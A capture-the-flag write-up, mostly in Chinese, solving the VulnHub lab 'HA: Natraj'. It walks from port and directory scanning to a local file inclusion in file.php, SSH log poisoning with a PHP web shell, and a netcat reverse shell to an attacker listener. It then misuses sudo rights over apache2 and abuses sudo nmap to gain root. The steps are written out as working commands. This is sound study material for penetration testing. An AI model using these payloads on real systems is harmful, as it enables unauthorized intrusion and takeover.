# HA: Natraj

2024-5-19 https://www.vulnhub.com/entry/ha-natraj,489/

difficulty: Easy

## IP

192.168.10.180

## Scan

Open Port -> 22,80

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 d99fdaf42e670192d5da7f70d006b392 (RSA)
|   256 bceaf13bfa7c050c929592e9e7d20771 (ECDSA)
|_  256 f0245b7a3bd6b794c44bfe5721f80061 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HA:Natraj
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

先对 80 web 服务进行目录扫描：

```
gobuster dir -u http://192.168.10.180/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -e

http://192.168.10.180/images               (Status: 301) [Size: 317] [--> http://192.168.10.180/images/]
http://192.168.10.180/index.html           (Status: 200) [Size: 14497]
http://192.168.10.180/console              (Status: 301) [Size: 318] [--> http://192.168.10.180/console/]
```

其中 /console 中显示了一个 file.php 文件，看上去可能像是个文件上传的接口或者是本地文件包含接口，但是需要 FUZZ 到相关的接口参数：

```
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.10.180/console/file.php?FUZZ=/etc/passwd -fs 0

file                    [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration: 0ms]
```

找到了 file 参数，具体看看返回什么内容：

```
curl http://192.168.10.180/console/file.php?file=/etc/passwd

root:x:0:0:root:/root:/bin/bash
...
natraj:x:1000:1000:natraj,,,:/home/natraj:/bin/bash
mahakal:x:1001:1001:,,,:/home/mahakal:/bin/bash
```

可以看到是一个文件包含漏洞，从/etc/passwd 中可以看到可用的用户名:root、natraj、mahakal

通过文件包含，也查找不到 natraj 和 mahakal 中.ssh 中的 id_rsa 文件。

得想办法得到 webshell，让我们找找 log，看看能否把 web shell 写入到日志文件中，然后包含这个日志文件就能解析。

```
ffuf -c -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u http://192.168.10.180/console/file.php?file=FUZZ -fs 0
```

我们发现了一个 /var/log/auth.log ，这个文件是记录 ssh 登陆认证的日志，我们可以用用户名为 <?php system($_GET[1]); ?> 的用户名去登陆，然后访问日志文件：

```
echo -n "<?php system($_GET[1]); ?>" | base64  # 直接使用 <?php system($_GET[1]); ?> 作为用户名报错，先对其进行base64编码

ssh "<?php system($_GET[1]); ?>"@192.168.10.180  # 出现 remote username contains invalid characters

curl http://192.168.10.180/console/file.php?file=/var/log/auth.log&cmd=ls
```

但是直接在命令行中 ssh 登陆，一直提示用户名 remote username contains invalid characters，经过查找，高本版的 openssh 中已经对用户名的特殊字符进行了限制，必须使用低版本的 openssh 才行。

免去找低版本的烦恼，直接用 msf 中的 scanner/ssh/ssh_login 模块，设置 username 为 <?php system($_GET[1]);?>，同时随便设置 PASSWORD，然后 run，这时后门代码已经入住到 auth.log 中，再次访问日志文件，激活 web shell：

对后门代码进行检测看是否能执行命令：

```
curl "http://192.168.10.180/console/file.php?file=/var/log/auth.log&1=pwd"
```

在 kali 上进行监听 8888 端口，激活反弹 shell：

```
curl 'http://192.168.10.180/console/file.php?file=/var/log/auth.log&1=which%20nc'  # 发现目标机器有nc /bin/nc,所以使用nc进行反弹shell

curl 'http://192.168.10.180/console/file.php?file=/var/log/auth.log&1=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20192.168.10.3%208888%20%3E%2Ftmp%2Ff'
```

得到了反弹的 shell，进行系统枚举，suid 没有发现特殊的程序：

```
find / -perm -u=s -ls 2>/dev/null
```

sudo -l 发现我们能重启 apache 服务，并且对 /etc/apache2/apache2.conf 具有完全修改的访问权限：

```
(ALL) NOPASSWD: /bin/systemctl start apache2
(ALL) NOPASSWD: /bin/systemctl stop apache2
(ALL) NOPASSWD: /bin/systemctl restart apache2

ls -al /etc/apache2/apache2.conf
```

在/home 的 2 个用户中，进行尝试，切换这 2 个用户，分别启动 apache，结果 mahakla 用户能启动启动后，能有继续提权的路径（最后通过 root 权限查看了 /etc/sudoers， 没有配置 natraj 的选项，没有利用的路径）：

```
User mahakal
Group mahakal
```

先将我们的后门 php 脚本，下载到 /var/www/html 中，方便我们后门反弹链接。

然后重启 apache2 服务：

```
sudo /bin/systemctl restart apache2
```

这时，得到了 mahakal 权限的反弹 shell，并且发现 sudo 中可以使用 nmap：

```
(root) NOPASSWD: /usr/bin/nmap
```

进行利用，直接升级到 root：

```
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF

id
uid=0(root) gid=0(root) groups=0(root)
cd /root
ls
proof.txt
root.txt
cat proof.txt
9a94418bf0076d5016002829be2a8cf1
```
